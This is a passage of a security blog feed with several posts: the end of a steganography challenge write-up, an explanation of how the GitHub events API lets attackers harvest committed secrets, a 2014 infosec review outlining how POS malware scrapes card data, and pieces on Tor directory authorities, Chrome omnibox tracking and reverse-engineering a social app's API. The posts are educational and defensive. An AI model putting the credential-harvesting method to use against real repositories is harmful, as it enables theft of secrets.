<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans_recovered# stegdetect Tiny_Tom_Crutches_Final.jpg
</span><span class='line'>Tiny_Tom_Crutches_Final.jpg : f5(***)</span></code></pre></td></tr></table></div></figure>


<p>The hint we found pointing to <a href="https://code.google.com/p/f5-steganography/">this project</a> might come in handy. Let&rsquo;s see if we can use it to get the secret:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jordan:~/sans_recovered# java -jar f5.jar x -e secret.txt Tiny_Tom_Crutches_Final.jpg
</span><span class='line'>Huffman decoding starts
</span><span class='line'>Permutation starts
</span><span class='line'>423168 indices shuffled
</span><span class='line'>Extraction starts
</span><span class='line'>Length of embedded file: 116 bytes
</span><span class='line'>(1, 127, 7) code used
</span><span class='line'>root@jordan:~/sans_recovered# cat secret.txt
</span><span class='line'>Tiny Tom has died.
</span><span class='line'>
</span><span class='line'>USB Secret #4: You can prevent much grief and cause much joy. Hack for good, not evil or greed.</span></code></pre></td></tr></table></div></figure>


<p>There it is! All the secrets have been retrieved.</p>

<h3>Conclusion</h3>

<p>As always, this was a fantastic challenge created by the folks at SANS. I enjoyed that this year&rsquo;s challenge contained bits and pieces from many aspects of infosec, and am already looking forward to next year&rsquo;s challenge!</p>

<p>As always, let me know if you have any questions!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Why Deleting Sensitive Information from Github Doesn't Save You]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/30/why-deleting-sensitive-information-from-github-doesnt-save-you/"/>
    <updated>2014-12-30T19:19:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/30/why-deleting-sensitive-information-from-github-doesnt-save-you</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/harvest_github.png"/></p>

<p>So you accidentally committed a password or API key to Github. <strong><em>Ouch.</em></strong></p>

<p>&ldquo;No problem!&rdquo;, you think, &ldquo;I&rsquo;ll just follow Github&rsquo;s helpful information on <a href="https://help.github.com/articles/remove-sensitive-data/">how to delete sensitive information</a> and I&rsquo;ll be fine!&rdquo;</p>

<p>Just today, I saw a <a href="http://www.devfactor.net/2014/12/30/2375-amazon-mistake/">great article</a> detailing one developer&rsquo;s experience with committing sensitive information to Github. Unfortunately, this article missed the main point. In this post, I&rsquo;m going to show exactly how hackers <em>instantly</em> harvest information committed to public Github repositories, and why deleting this information doesn&rsquo;t solve the problem.</p>

<!--more-->


<h3>Drinking from Github&rsquo;s Firehose</h3>

<p>Github has an extensive API. One of the most useful endpoints is located at <a href="https://developer.github.com/v3/activity/events/"><code>/events</code></a>. This endpoint basically provides a firehose of <em>all</em> public events as they happen. This includes account creation, code commits, and more. Just &ldquo;star&rdquo; a repository? It was published at <code>/events</code>.</p>

<p>Hackers can use this endpoint to watch for any and all code commits. Once a commit is found, they can instantly make a request to the <a href="https://developer.github.com/v3/git/commits/"><code>repos/:owner/:repo/git/commits/:sha1</code></a> endpoint to get the details for that commit. Part of these details is a reference to the project snapshot, or <code>tree</code>, for that commit (the files themselves). This tree has it&rsquo;s own SHA1, that can be used in the <a href="https://developer.github.com/v3/git/trees/"><code>repos/:owner/:repo/git/tree/:sha1?recursive=1</code></a> endpoint to get a full listing of files in the repository.</p>

<p>Each of these listings has a reference to the file&rsquo;s actual content for the commit. A request can be made to the <a href="https://developer.github.com/v3/git/blobs/"><code>/repos/:owner/:repo/git/blobs/:sha1</code></a> endpoint to get this file content, which will include the sensitive information!</p>

<p>These 4 requests are made in a matter of seconds, and can be sped up by caching the SHA1 of files to determine if the file has been changed. It&rsquo;s a good thing that no one has made a system that&rsquo;s been caching all this data this entire time, right?</p>

<h3>Say Hello to GHTorrent</h3>

<p><a href="http://ghtorrent.org/">GHTorrent</a> advertises itself as an &ldquo;offline mirror of data&rdquo;. In a nutshell, it keeps track of <em>a ton</em> of data that flows through Github&rsquo;s Events API stream, and recursively resolves dependencies to relate, say, a commit object to an event object. Currently, they suggest they have accumulated the data from 2012-2014.</p>

<p>This database has incredible potential for researchers, but also allows for hackers to pull previously deleted or changed data en masse. Granted, from what I can tell they don&rsquo;t store the actual file content (so your accidentally committed password won&rsquo;t be stored), but that doesn&rsquo;t mean that there isn&rsquo;t sensitive data to be had.</p>

<p>Consider the email address used to create a Github account, or commit a code change. Both of these actions created an event that was harvested by GHTorrent. Here&rsquo;s an example showing the details of a particularly <a href="https://github.com/jordan-wright">talented developer</a>:</p>

<p><img src="http://jordan-wright.github.io/images/blog/harvest_github/db.png"/></p>

<p>Currently, it looks like there are about 4.7 million accounts cached in GHTorrent, with over 3.4 million having a non-null email address. That&rsquo;s a lot of email addresses.</p>

<p>GHTorrent is just an example. While it doesn&rsquo;t appear to store all content, it would be trivial for hackers to reproduce the project with the added feature of searching commits for sensitive information as the events are generated. This searching can be done using keywords such as &ldquo;password&rdquo;, &ldquo;key&rdquo;, etc.</p>

<h3>The Only Way to be Safe</h3>

<p>Hopefully it&rsquo;s clear that deleting sensitive information from Github doesn&rsquo;t solve the problem. The <strong>only</strong> way to protect your assets after committing sensitive information is to consider the information compromised and to change the password/API key/whatever. Then, make sure to avoid committing this data in the future!</p>

<p>Be smart &ndash; protect your data.</p>

<p>-Jordan (<a href="https://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What InfoSec Learned in 2014]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/28/what-infosec-learned-in-2014/"/>
    <updated>2014-12-28T20:38:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/28/what-infosec-learned-in-2014</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/what_infosec_2014.png"/></p>

<p><em>Busy year.</em></p>

<p>It seems as though each year brings more and more events that throw our industry into the forefront of attention &ndash; and they&rsquo;re never good. At the same time, it&rsquo;s key to remember that these events allow us to learn and evolve as an industry. Let&rsquo;s take a look at some of the key things we as an infosec industry can learn from 2014:</p>

<!--more-->


<p><img class="section_header" src="http://jordan-wright.github.io/images/blog/infosec_2014/heartbleed.png"/></p>

<h3>No Software is Safe, or Why Your Vulnerability Doesn&rsquo;t Need a Logo</h3>

<p>Heartbleed and Shellshock were arguably two of the most critical vulnerabilities our industry has seen in a while. These vulnerabilities provided a stark reminder that &ndash; as the security community often quips &ndash; no software is safe. The importance and widespread use of both OpenSSL and Bash contributed to a large, immediate impact when the vulnerabilities were announced.</p>

<p>This impact was also largely fueled by the media. Now, many people would take the stark stance that assigning names and logos to vulnerabilities is ridiculous, and I mostly agree. However, it&rsquo;s important to at least consider the benefits this approach had. Too often, vulnerabilities aren&rsquo;t patched because they simply aren&rsquo;t kept up with. It&rsquo;s mind numbing trying to keep up with every CVE-<em>xxxx</em> affecting every piece of software. In these cases, since the vulnerabilities were critical enough, this approach of marketing to the media worked really well &ndash; many systems were patched quickly<sup>1</sup>.</p>

<p>But sadly, we can already see this being overused. It seems as though anyone who thinks they have found a critical vulnerability needs to find some kind of catchy name to put with it. And I get it &ndash; CVE-2014-0160 isn&rsquo;t as dangerous sounding as <strong><em>Heartbleed</em></strong>, and CVE-2014-6271 + related isn&rsquo;t as hacker-scary sounding as <strong><em>Shellshock</em></strong>. Add logos to go with the catchy names? Marketing people <strong>love</strong> it.</p>

<p>I have no doubt that 2015 will bring with it more critical vulnerabilities in well-known, established pieces of software. I only hope that we can use the lessons-learned from Heartbleed and Shellshock to mature as an industry and approach the marketing and distribution of these details in a responsible, controlled way. Not every vulnerability needs a full marketing team behind it.</p>

<p><img class="section_header" src="http://jordan-wright.github.io/images/blog/infosec_2014/router.png"/></p>

<h3>Embedded Devices: Hacking Like it&rsquo;s 1995</h3>

<p>While the (in)security of embedded devices such as SOHO routers isn&rsquo;t particularly new, there were a substantial number of critical vulnerabilities recently released for these devices. These vulnerabilities includes <a href="https://github.com/elvanderb/TCP-32764">blatant</a> <a href="http://www.devttys0.com/2013/10/reverse-engineering-a-d-link-backdoor/">backdoors</a>, web-app security 101 <a href="http://mis.fortunecook.ie/">blunders</a>, or just bad software.</p>

<p>The primary cause for concern with these vulnerabilities is that they affect a <em>ton</em> of devices. For example, the recently reported <a href="http://mis.fortunecook.ie/">&ldquo;Misfortune Cookie&rdquo;</a> vulnerability &ndash; complete with a name and logo &ndash; claims to affect &ldquo;12 million &hellip; unique devices&rdquo;. Unfortunately, security appears to be put on the backburner when it comes to the development of embedded devices, likely due to either infosec ignorance or simply because manufacturers don&rsquo;t think attackers will target their systems &ndash; I am a fan of the latter.</p>

<p>I wholeheartedly expect to see a wider emphasis put on attacking embedded devices &ndash; particularly network devices &ndash; in 2015. The fact that in 2012 over 400,000 devices can be <a href="http://internetcensus2012.bitbucket.org/paper.html">commandeered using default passwords</a> alone should be considered a substantial threat. Sadly, it will only get worse before it gets better. The only way to fix the situation will be to continue finding and publishing vulnerabilities in these devices in the hopes that manufacturers will start placing a higher emphasis on device security.</p>

<p>Here&rsquo;s hoping for the best.</p>

<p><img class="section_header" src="http://jordan-wright.github.io/images/blog/infosec_2014/pos.png"/></p>

<h3>POS Software = POS</h3>

<p>Compromising Point-of-Sale (POS) devices became the new-hotness for cybercriminals this year. Notable breaches of retailers such as Target and Home Depot caused massive re-issuing of bank credit/debit cards, hefty financial losses, and resulted in some nice <a href="http://cdn.arstechnica.net/wp-content/uploads/2014/12/document4.pdf">class action complaint readings</a>.</p>

<p>The key thing to note about these breaches is that POS malware such as <a href="http://blog.spiderlabs.com/2013/05/alina-shedding-some-light-on-this-malware-family.html">Alina</a>, <a href="http://blog.spiderlabs.com/2014/02/jackpos-the-house-always-wins.html">JackPOS</a>, etc. <strong>is not sophisticated</strong>. It&rsquo;s not. Generally, it works like this:</p>

<ul>
<li>Check if a POS software process is running</li>
<li>Dump the memory of that process</li>
<li>Grep for 16 numbers in a row</li>
<li>Validate it&rsquo;s a valid CC using something like Luhn&rsquo;s algorithm</li>
<li>Send it off to a server</li>
<li>Repeat</li>
</ul>


<p><em>Groundbreaking.</em></p>

<p>So why did this work so well? Turns out, these POS systems (like embedded devices) have not gone through through the gamut of security scrutiny that standard software has. This makes sense, since the market-share for this software was much smaller (meaning less installs of the software than, say, Java or Flash).</p>

<p>But the criminals figured something out. Maybe market share isn&rsquo;t as important as we thought it was. Maybe there is low-hanging fruit that can give enough yield when compromised that it&rsquo;s worth looking into. A <a href="https://www.fox-it.com/en/files/2014/12/Anunak_APT-against-financial-institutions2.pdf">recent report</a> by security firm Fox-IT summed it up nicely:</p>

<blockquote><p>[Hackers] can steal $2000 a thousand times, and earn $2 million, but also they can steal it in one time and immediately get it with much less effort&hellip;</p></blockquote>

<p>Don&rsquo;t get me wrong &ndash; consumer malware families like Zeus will still have a place in the industry while there is money to be made in selling harvested information. However, I have no doubt that Target and Home Depot will only be the beginning of these retailer breaches, at least until chip-and-pin cards are the industry default.</p>

<h3>Conclusion</h3>

<p>It&rsquo;s clear that our industry is showing no signs of slowing down (and hey, I <span><i class="fa fa-heart-o"></i> job security</span>). However, we need to push forward into the next year with the mindset that <em>we&rsquo;re still losing</em>. This next year will bring more breaches, more vulnerabilities, and more lessons to be learned.</p>

<p>As always, let me know if you have any questions or comments below.</p>

<p>[1] <a href="https://jhalderm.com/pub/papers/heartbleed-imc14.pdf">https://jhalderm.com/pub/papers/heartbleed-imc14.pdf</a></p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What Happens if Tor Directory Authorities are Seized?]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/19/what-happens-if-tor-directory-authorities-are-seized/"/>
    <updated>2014-12-19T18:43:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/19/what-happens-if-tor-directory-authorities-are-seized</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/tor_seized.png"/></p>

<h3>Introduction</h3>

<p>The Tor Project <a href="https://blog.torproject.org/blog/possible-upcoming-attempts-disable-tor-network">has announced</a> that they have received threats about possible upcoming attempts to disable the Tor network through the seizure of Directory Authority (DA) servers. While we don&rsquo;t know the legitimacy behind these threats, it&rsquo;s worth looking at the role DA&rsquo;s play in the Tor network, showing what effects their seizure could have on the Tor network.*</p>

<!--more-->


<h3>What are Directory Authorities?</h3>

<p>Simply put, think of the DA servers as the trusted providers of a phonebook. This phonebook &ndash; called the <em>consensus</em> &ndash; contains the complete information about each known Tor relay, and is updated every hour. When it&rsquo;s time to update the list, a majority of the directory authorities must agree on the accuracy of the new list by cryptographically signing the proposed consensus. Once this process is complete, clients are able to download the updated list of relays.</p>

<p>There are currently 10 DA&rsquo;s whose information is <a href="https://gitweb.torproject.org/tor.git/tree/src/or/config.c#n824">hardcoded into Tor clients</a> &ndash; one of which (Tonga) is used for bridge access. This means that, to keep the network updated and stable, <strong>5 DA&rsquo;s must still be operational</strong>. If a seizure attempt is able to take down 5 or more DA&rsquo;s, the network will enter an unstable state, and the integrity of any updates to the consensus cannot be guaranteed.</p>

<h3>Where are the DA&rsquo;s Located?</h3>

<p>The seizure of 5 or more DA&rsquo;s would be a large feat, but it is absolutely possible. As one commenter on HN <a href="https://news.ycombinator.com/item?id=8775028">mentioned</a>, it would only take a joint effort by the US and Germany to take down 5 DA servers. Another <a href="https://news.ycombinator.com/item?id=8775009">comment</a> provides the geolocation and organization of each DA.</p>

<h3>The Aftermath</h3>

<p>An attack seizing the DA servers would severely cripple the Tor network. The Tor Project would not only need to replace the DA servers, but would then need to introduce a client update with the new DA information. During this time, the integrity of the consensus could not be trusted, and it would be <a href="https://blog.torproject.org/blog/possible-upcoming-attempts-disable-tor-network#comment-83762">increasingly difficult</a> for new clients to be introduced into the Tor network.</p>

<h3>This Doesn&rsquo;t Solve the Problem</h3>

<p>It&rsquo;s important to note that severing the Tor network doesn&rsquo;t solve any problem. Tor provides an invaluable escape from censorship, and the means to having privacy from otherwise prying eyes. I&rsquo;m confident that the Tor Project will be resilient in recovering from any attempted takedown attempts.</p>

<h3>More Information</h3>

<p>Further information and detailed status (obtained from the updated consensus) about each of the Tor Directory Authorities can be found at the following links:</p>

<ul>
<li><a href="https://globe.torproject.org/#/relay/CF6D0AAFB385BE71B8E111FC5CFF4B47923733BC">Faravahar &ndash; 154.35.32.5:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/0AD3FA884D18F89EEA2D89C019379E0E7FD94417">urras &ndash; 208.83.223.34:80</a></li>
<li><a href="https://globe.torproject.org/#/relay/7BE683E65D48141321C5ED92F075C55364AC7123">dannenberg &ndash; 193.23.244.244:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/4A0CCD2DDC7995083D73F5D667100C8A5831F16D">Tonga (<strong>bridge DA</strong>) &ndash; 82.94.251.203:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/9695DFC35FFEB861329B9F1AB04C46397020CE31">moria1 &ndash; 128.31.0.34:9101</a></li>
<li><a href="https://globe.torproject.org/#/relay/BD6A829255CB08E66FBE7D3748363586E46B3810">maatuska &ndash; 171.25.193.9:80</a></li>
<li><a href="https://globe.torproject.org/#/relay/F2044413DAC2E02E3D6BCF4735A19BCA1DE97281">gabelmoo &ndash; 131.188.40.189:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/7EA6EAD6FD83083C538F44038BBFA077587DD755">dizum &ndash; 194.109.206.212:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/74A910646BCEEFBCD2E874FC1DC997430F968145">longclaw &ndash; 199.254.238.52:443</a></li>
<li><a href="https://globe.torproject.org/#/relay/847B1F850344D7876491A54892F904934E4EB85D">tor26 &ndash; 86.59.21.38:443</a></li>
</ul>


<p>Information regarding any updates to this situation can be found on the <a href="https://blog.torproject.org/blog/">Tor Project blog</a>.</p>

<p>As always, let me know if you have any questions or comments below!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>

<p><em>*It is worth noting that I am by no means a Tor expert, and am relying on knowledge gained from <a href="http://jordan-wright.github.io/blog/2014/10/06/creating-tor-hidden-services-with-python/">previous</a> <a href="http://raidersec.blogspot.com/2013/09/mapping-tor-relays-and-exit-nodes.html">research</a> into the Tor network structure.</em></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Chrome Tracks Every Key Typed into the Omnibox]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/18/chrome-tracks-every-key-typed-into-omnibox/"/>
    <updated>2014-12-18T23:43:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/18/chrome-tracks-every-key-typed-into-omnibox</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/browser_tracking.png"/></p>

<blockquote><p>Friendly Reminder: Browser makers may track every key you type in the URL bar</p></blockquote>

<h3>Introduction</h3>

<p>Technologies like Google Chrome&rsquo;s Omnibox makes searching easier. However, these quick search suggestions come at a price. This post is a friendly reminder that you may want to consider turning off predictive search to protect your privacy.</p>

<!--more-->


<h3>How the Omnibox Works</h3>

<p>Predictive search isn&rsquo;t magic. Chrome doesn&rsquo;t come shipped with a built-in collection of popular searches. No, the only way to get suggestions for what you are searching is to <em>ask Google</em>. This happens by sending a request to Google for search suggestions <strong>for every key typed in the omnibox</strong> &ndash; by default.</p>

<p>What does this look like? After installing Burp&rsquo;s CA certificate and starting <code>chrome.exe</code> with the <code>--allow-ssl-mitm-proxies</code> option, we can see the following requests pop up as we search:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=o
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=om
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omg
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgw
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwt
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtf
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtfb
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtfbb
</span><span class='line'>GET /complete/search?client=chrome-omni&gs_ri=chrome-ext&xssi=t&q=omgwtfbbq</span></code></pre></td></tr></table></div></figure>


<blockquote><p><em>But I&rsquo;m searching these things anyway!</em></p></blockquote>

<p>Sure, this might be fine for searches, but what else could be sent via this method? Hostnames, web addresses, and IP addresses are <strong><em>all</em></strong> sent to Google before you press enter. This means that Google knows if you visit a website, even if you don&rsquo;t visit the site from search results.</p>

<h4>Disabling Omnibox</h4>

<p>Since this setting is enabled by default, here&rsquo;s how to disable it:</p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#019875"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">1</i>
</span> Navigate to <code>chrome://settings</code></p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#019875"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">2</i>
</span> Click &ldquo;Show Advanced Settings&rdquo;</p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#019875"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">3</i>
</span> Uncheck &ldquo;Use a prediction service to help complete searches&hellip;&rdquo;</p>

<p><img src="http://jordan-wright.github.io/images/blog/browser_track/omnibox.png"/></p>

<h3>Chrome Isn&rsquo;t the Only One</h3>

<p>It&rsquo;s important to note that Chrome isn&rsquo;t the only browser that has this capability. Internet Explorer has the same feature from Bing. The only difference is that this isn&rsquo;t default behavior, and has to be explicitly enabled.</p>

<h3>Putting Things in Perspective</h3>

<p>This isn&rsquo;t new information &ndash; more of a friendly reminder. It&rsquo;s important to put these privacy &ldquo;risks&rdquo; in perspective and determine what is more important to you &ndash; keeping your browsing history and IP/hostname scheme private, or getting solid search suggestions.</p>

<p>As always, let me know if you have any questions/comments below.</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[My (Probably Boring) Research Papers on Security]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/12/02/my-probably-boring-research-papers-on-security/"/>
    <updated>2014-12-02T22:50:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/12/02/my-probably-boring-research-papers-on-security</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/papers.png"/></p>

<h3>Introduction</h3>

<p>I&rsquo;ve always been a proponent and contributor of open-source projects and information. I strongly believe that information and knowledge should be shared as much and as freely as possible &ndash; progress happens this way.</p>

<p>As such, I&rsquo;ve decided to &ldquo;open-source&rdquo;, if you will, the academic essays I wrote regarding information security and software development my last couple of semesters at Texas Tech. It&rsquo;s my hope that people find these useful, either by provoking thought and discussion or simply by serving as material to help people fall asleep a little easier.</p>

<p>Please bear in mind some of these papers were written <del>the night before</del> in a short time-span.</p>

<!--more-->


<h3>The Papers</h3>

<p>Here are the papers (in no particular order):</p>

<ul>
<li><a href="https://www.dropbox.com/s/y7mz05n47zs71qu/A%20Systems%20Analysis%20of%20the%20Cybercrime%20Industry.pdf?dl=0"><em>A Systems Analysis of the Cybercrime Industry</em></a> &ndash; A formal systems analysis of the current cybercrime industry, showing how this industry is similar to &ldquo;a market for lemons&rdquo;.</li>
<li><a href="https://www.dropbox.com/s/rvk6ybbl85zce00/The%20Fault%20Tolerance%20of%20Botnets.pdf?dl=0"><em>The Fault Tolerance of Botnets</em></a> &ndash; Studying fault tolerant models of botnets</li>
<li><a href="https://www.dropbox.com/s/jy8v6tmsjyr65z5/The%20State%20of%20Email%20Security.pdf?dl=0"><em>The State of Email Security</em></a> &ndash; A study regarding the history and current state of email threats and subsequent security mitigations.</li>
<li><a href="https://www.dropbox.com/s/db2tbau0jdv9pym/Paradigm%20Exercise.pdf?dl=0"><em>Paradigm Shift in Software Development</em></a> &ndash; A brief look into how the creation and establishment of the OSS movement created a paradigm shift in software development methodologies.</li>
</ul>


<p>As always, let me know if you have any questions or comments below! It is worth noting that I do my best to provide the best attribution possible, but if you find mistakes please let me know and I will correct it immediately.</p>

<p>Enjoy!</p>

<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Reverse Engineering the We Heart It API]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/10/12/reverse-engineering-the-we-heart-it-api/"/>
    <updated>2014-10-12T20:40:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/10/12/reverse-engineering-the-we-heart-it-api</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/weheartit_api.png"/></p>

<h3>Introduction</h3>

<p>A while back, I came across the article from the The Washington Post describing We Heart It, a social network claiming <a href="http://www.washingtonpost.com/news/the-intersect/wp/2014/05/07/30-million-people-use-this-social-network-and-youve-probably-never-heard-of-it/">over 30 million users</a>. If you haven&rsquo;t seen it, <a href="http://weheartit.com">We Heart It</a> (from here on out abbreviated as WHI) is a social network which encourages people to post and share photos and images of things that inspire them.</p>

<p>Having such a large user-base, I was interested in seeing what kind of API the site offered developers. However, I was disappointed when I found out that the API was <a href="https://weheartit.com/partners">closed to &ldquo;partners&rdquo;</a>, and even this is not a full REST API, but rather a simple button developers can place on their website to allow users to interact with WHI.</p>

<p>With this being the case, I decided to take a look at the Android and iPhone apps using both static and dynamic analysis in an experiment to see if I could reverse engineer the API used on the backend. Here are the results.</p>

<!--more-->


<h3>Dynamic Analysis</h3>

<p>Dynamic analysis is generally a bit quicker and can help give a good overview into how the application functions. By <a href="http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/">intercepting traffic using a proxy</a>, we can easily analyze the structure of requests/responses in use by the application.</p>

<h4>Registration &amp; Authentication</h4>

<p>Loading up the WHI iPhone app and attempting to register an account shows the following request/response:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /api/users HTTP/1.1
</span><span class='line'>Host: api.weheartit.com
</span><span class='line'>
</span><span class='line'>&lt;snip&gt;
</span><span class='line'>client_id=redacted
</span><span class='line'>&client_secret=redacted
</span><span class='line'>&user[email]=redacted
</span><span class='line'>&user[name]=redacted
</span><span class='line'>&user[password]=redacted
</span><span class='line'>&user[username]=redacted
</span><span class='line'>
</span><span class='line'>{
</span><span class='line'>    "result":"success",
</span><span class='line'>    "object":
</span><span class='line'>    {   "id":27215547,
</span><span class='line'>            "username":"jordan_test2",
</span><span class='line'>            "name":"Jordan Test",
</span><span class='line'>            "location":"",
</span><span class='line'>            "bio":"",
</span><span class='line'>            &lt;snip&gt;
</span><span class='line'>            "public_account":true,
</span><span class='line'>            "verified":false,
</span><span class='line'>            "created_at":"2014-10-12T18:38:35Z",
</span><span class='line'>            "email":"redacted",
</span><span class='line'>            "cover_image": { &lt;snip&gt; }
</span><span class='line'>    }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p><em>Note: I originally contacted the WHI security team since the login page (and every other page) was served via HTTP. This has since been fixed.</em></p>

<p>Registering an account automatically logs the user in. This launches the OAuth2 authentication flow to generate an access token which is used in an <code>Authorization: Bearer</code> header for all API calls:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /oauth/token HTTP/1.1
</span><span class='line'>Host: api.weheartit.com
</span><span class='line'>
</span><span class='line'>&lt;snip&gt;
</span><span class='line'>client_id=redacted
</span><span class='line'>&client_secret=redacted
</span><span class='line'>&grant_type=password
</span><span class='line'>&password=redacted
</span><span class='line'>&username=redacted
</span><span class='line'>
</span><span class='line'>{
</span><span class='line'>    "access_token":"redacted",
</span><span class='line'>    "token_type":"bearer",
</span><span class='line'>    "expires_in":31104000,
</span><span class='line'>    "refresh_token":"redacted",
</span><span class='line'>    "scope":"public"
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>This token is then used to make API calls to the WeHeartIt backend using a RESTful JSON API. Here are a couple of examples of this (some response details have been removed for brevity):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /api/v2/entries/85847648 HTTP/1.1
</span><span class='line'>Host: api.weheartit.com
</span><span class='line'>Authorization: Bearer [redacted]
</span><span class='line'>
</span><span class='line'>{
</span><span class='line'>    "id": 85847648,
</span><span class='line'>    "title": "Colors",
</span><span class='line'>    &lt;snip&gt;
